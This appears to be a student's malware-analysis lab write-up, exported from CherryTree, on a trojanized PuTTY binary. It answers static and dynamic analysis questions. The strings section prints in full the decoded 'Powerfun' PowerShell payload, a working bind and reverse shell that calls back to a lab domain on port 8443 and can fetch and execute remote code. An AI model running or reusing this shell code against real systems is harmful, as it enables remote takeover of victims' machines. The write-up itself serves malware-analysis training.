<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Challenge 1 - Putty</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Challenge 1 - Putty</h1><br/><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> What is the SHA256 hash of the sample?</span> - 0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83</p><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> What architecture is this binary?</span> - 32bit </p><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Are there any results from submitting the SHA256 hash to VirusTotal??</span> - Trojan - Metasploit/Merterpeter</p><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?</span></p><p>- Base64 then Gunzip a powershell script </p><p># Powerfun - Written by Ben Turner &amp; Dave Hardy</p><p></p><p>function Get-Webclient </p><p>{</p><p>    $wc = New-Object -TypeName Net.WebClient</p><p>    $wc.UseDefaultCredentials = $true</p><p>    $wc.Proxy.Credentials = $wc.Credentials</p><p>    $wc</p><p>}</p><p>function powerfun </p><p>{ </p><p>    Param( </p><p>    [String]$Command,</p><p>    [String]$Sslcon,</p><p>    [String]$Download</p><p>    ) </p><p>    Process {</p><p>    $modules = @()  </p><p>    if ($Command -eq &quot;bind&quot;)</p><p>    {</p><p>        $listener = [System.Net.Sockets.TcpListener]8443</p><p>        $listener.start()    </p><p>        $client = $listener.AcceptTcpClient()</p><p>    } </p><p>    if ($Command -eq &quot;reverse&quot;)</p><p>    {</p><p>        $client = New-Object System.Net.Sockets.TCPClient(&quot;bonus2.corporatebonusapplication.local&quot;,8443)</p><p>    }</p><p></p><p>    $stream = $client.GetStream()</p><p></p><p>    if ($Sslcon -eq &quot;true&quot;) </p><p>    {</p><p>        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))</p><p>        $sslStream.AuthenticateAsClient(&quot;bonus2.corporatebonusapplication.local&quot;) </p><p>        $stream = $sslStream </p><p>    }</p><p></p><p>    [byte[]]$bytes = 0..20000|%{0}</p><p>    $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)</p><p>    $stream.Write($sendbytes,0,$sendbytes.Length)</p><p></p><p>    if ($Download -eq &quot;true&quot;)</p><p>    {</p><p>        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;[+] Loading modules.`n&quot;)</p><p>        $stream.Write($sendbytes,0,$sendbytes.Length)</p><p>        ForEach ($module in $modules)</p><p>        {</p><p>            (Get-Webclient).DownloadString($module)|Invoke-Expression</p><p>        }</p><p>    }</p><p></p><p>    $sendbytes = ([text.encoding]::ASCII).GetBytes(&#39;PS &#39; + (Get-Location).Path + &#39;&gt;&#39;)</p><p>    $stream.Write($sendbytes,0,$sendbytes.Length)</p><p></p><p>    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</p><p>    {</p><p>        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding</p><p>        $data = $EncodedText.GetString($bytes,0, $i)</p><p>        $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )</p><p></p><p>        $sendback2  = $sendback + &#39;PS &#39; + (Get-Location).Path + &#39;&gt; &#39;</p><p>        $x = ($error[0] | Out-String)</p><p>        $error.clear()</p><p>        $sendback2 = $sendback2 + $x</p><p></p><p>        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)</p><p>        $stream.Write($sendbyte,0,$sendbyte.Length)</p><p>        $stream.Flush()  </p><p>    }</p><p>    $client.Close()</p><p>    $listener.Stop()</p><p>    }</p><p>}</p><p></p><p>powerfun -Command reverse -Sslcon true</p><p></p><p></p><p>Looks like this malware has a reverse shell and bind shell capabilities </p><p>Reverse (call back address - bonus2.corporatebonusapplication.local&quot;,8443) </p><p>Bind (listen on 8443) </p><p></p><p></p><p></p><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?</span></p><p>   → Clipboard manipulation, SID querying, Registry manipulation, Process/Thread querying and creation, Open/Terminate processes and writing files, writes to console</p><p><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Is it likely that this binary is packed?</span> - No</p><p></p><p>Dynamic-----</p><p></p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Describe initial detonation. Are there any notable occurances at first detonation? </span></p><p><span style="color:#2b2b2b;">Without internet simulation? Powershell spawned with encoded commands </span></p><p><span style="color:#2b2b2b;"> With internet simulation?</span> DNS requests </p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?</span> a powershell script with bind and reverse shell capabilities. we can use procmon to identify this. </p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> What is the DNS record that is queried at detonation?</span> bonus2.corporatebonusapplication.local: type A, class IN</p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> What is the callback port number at detonation?</span> 8443</p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> What is the callback protocol at detonation?</span> The port 8443 is the default port that Tomcat use to open SSL text service</p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> How can you use host-based telemetry to identify the DNS record, port, and protocol?</span> Adding the process and Operation Contains TCP to the filter </p><p><span style="color:#2b2b2b;"> </span><span style="color:#6796e6;">-</span><span style="color:#2b2b2b;"> Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?</span> shell does not spawn without proper ssl </p><p></p></div>
</body>
</html>
